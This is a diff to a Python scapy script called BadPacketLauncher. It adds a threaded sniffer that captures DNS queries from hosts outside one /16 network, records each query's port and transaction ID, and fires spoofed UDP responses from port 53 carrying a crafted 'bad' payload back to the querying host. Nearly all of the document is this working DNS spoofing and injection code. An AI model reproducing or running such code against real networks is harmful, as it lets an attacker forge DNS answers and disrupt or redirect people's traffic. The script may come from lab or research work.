@@ -8,7 +8,34 @@ import socket
 import ipaddress
 import scapy.all as network
 import struct
+import threading
+
 import bad_packet
+
+class SniffSniff(threading.Thread):
+
+    def __init__(self, outer_scope):
+        threading.Thread.__init__(self)
+
+        self.__outer_scope = outer_scope
+        self.__question    = None
+        self.__receiver    = None
+        self.__isrunning   = True
+
+    def __get_packet(self, packet):
+        if network.DNS in packet and\
+        ipaddress.IPv4Address(packet[network.IP].src) not in ipaddress.IPv4Network("129.22.0.0/16"):
+
+            self.__outer_scope.__dict__["_BadPacketLauncher__question"] = packet[network.UDP].sport, packet[network.DNS].id
+            self.__outer_scope.__dict__["_BadPacketLauncher__receiver"] = packet[network.IP].src
+
+    def run(self):
+        while(self.__isrunning):
+            network.sniff(filter="ip and udp", prn=self.__get_packet, timeout=5)
+
+    def terminate(self):
+        self.__isrunning = False
+
 
 class BadPacketLauncher(object):
 
@@ -29,13 +56,6 @@ class BadPacketLauncher(object):
 
         return UDP_header / raw_packet
         
-    def __get_packet(self, packet):
-        if network.DNS in packet and\
-        ipaddress.IPv4Address(packet[network.IP].src) not in ipaddress.IPv4Network("129.22.0.0/16"):
-
-            print(packet[network.IP].src)
-            self.__question   = packet[network.UDP].sport, packet[network.DNS].id
-            self.__receiver   = packet[network.IP].src
 
     def __udp_spoofing(self, identification, dest) -> None:
         '''
@@ -49,21 +69,31 @@ class BadPacketLauncher(object):
         return struct.pack("!4H", 53, destination_port, length, 0) + bad
 
     def run(self):
-   
+        
         try:
+            sniffer = SniffSniff(self)
+            sniffer.start()
+
             while(True):
-                network.sniff(filter="ip and udp", prn=self.__get_packet, timeout=5)
-                print("Server", self.__receiver, "ID:", int(self.__question[0]))
+                if self.__receiver and self.__question:
+                    print("Server", self.__receiver, "ID:", int(self.__question[0]))
 
-                source, identification = self.__question
+                    source, identification = self.__question
 
-                print("sending...")
-                self.__master.sendto(
-                    self.__udp_spoofing(identification, source), 
-                    (self.__receiver, int(self.__question[0])))
+                    print("sending...")
+                    self.__master.sendto(
+                        self.__udp_spoofing(identification, source), 
+                        (self.__receiver, int(self.__question[0])))
+                    
+                    self.__receiver = None
+                    self.__question = None
 
         except KeyboardInterrupt:
+            sniffer.terminate()
             exit(0)
+
+        except TypeError:
+            exit(1)
 
 
 
